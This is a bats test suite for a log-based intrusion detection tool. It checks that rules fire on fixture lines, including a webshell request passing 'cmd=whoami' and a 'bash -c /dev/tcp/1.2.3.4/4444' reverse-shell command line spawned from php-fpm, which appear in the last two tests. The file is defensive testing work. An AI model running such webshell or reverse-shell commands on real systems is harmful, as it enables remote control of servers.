#!/usr/bin/env bats
# setup/teardown helpers shared by bats suites
load 'test_helper'

@test "rule_match: P2S-008 fires on php2shell UA" {
  stream=$(mkstream)
  awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_php2shell_ua.log" >>"$stream"
  run rule_match_stream "$stream"
  [ "$status" -eq 0 ]
  [[ "$output" == *"P2S-008"* ]]
}

@test "rule_match: P2S-017 fires on upload-progress query" {
  stream=$(mkstream)
  awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_access_upload_progress.log" >>"$stream"
  run rule_match_stream "$stream"
  [[ "$output" == *"P2S-017"* ]]
}

@test "rule_match: P2S-010 aggregates >=5 FPM memory lines" {
  stream=$(mkstream)
  # 5 identical memory-exhausted lines (threshold from plan 6.1)
  for i in 1 2 3 4 5; do
    ts=$(printf '2026-10-2%dT10:1%d:00Z' "$i" "$i")
    printf '%s\tfpm_error\t\t\t\t\t\t\t\t\t\tP2S-010\tPHP Fatal error:  Allowed memory size of 134217728 bytes exhausted\n' "$ts" >>"$stream"
  done
  run rule_match_stream "$stream"
  [[ "$output" == *"P2S-010"* ]]
}

@test "rule_match: P2S-011 fires on apache segfault fixture" {
  stream=$(mkstream)
  awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/mal_apache_segfault.log" >/dev/null
  printf '2026-10-21T10:13:00Z\tapache_error\t\t\t\t\t\t999\t\t\tP2S-011\tAH00052: child pid 4242 exit signal Segmentation fault (11)\n' >>"$stream"
  run rule_match_stream "$stream"
  [[ "$output" == *"P2S-011"* ]]
}

@test "rule_match: benign access line fires nothing" {
  stream=$(mkstream)
  awk -f "$SRC/lib/accesslog.awk" -v src=access_log "$FIX/benign_access.log" >>"$stream"
  run rule_match_stream "$stream"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "P2S-030 fires on webshell cmd in URI" {
  stream=$(mkstream)
  printf '2026-10-21T10:00:00Z\taccess_log\t1.2.3.4\tGET\t/uploads/sh.php?cmd=whoami\t200\t0\tcurl/8.5.0\t\t\t\t-\tGET /uploads/sh.php?cmd=whoami 200\n' >>"$stream"
  run rule_match_stream "$stream"
  [[ "$output" == *"P2S-030"* ]]
}

@test "P2S-025 fires on /dev/tcp cmdline" {
  stream=$(mkstream)
  printf '2026-10-21T10:00:00Z\tproc\t\t\t\t\t\t4242\t\t\t\tP2S-025\tsuspicious cmdline: bash -c /dev/tcp/1.2.3.4/4444 (parent=php-fpm8.2)\n' >>"$stream"
  run rule_match_stream "$stream"
  [[ "$output" == *"P2S-025"* ]]
}
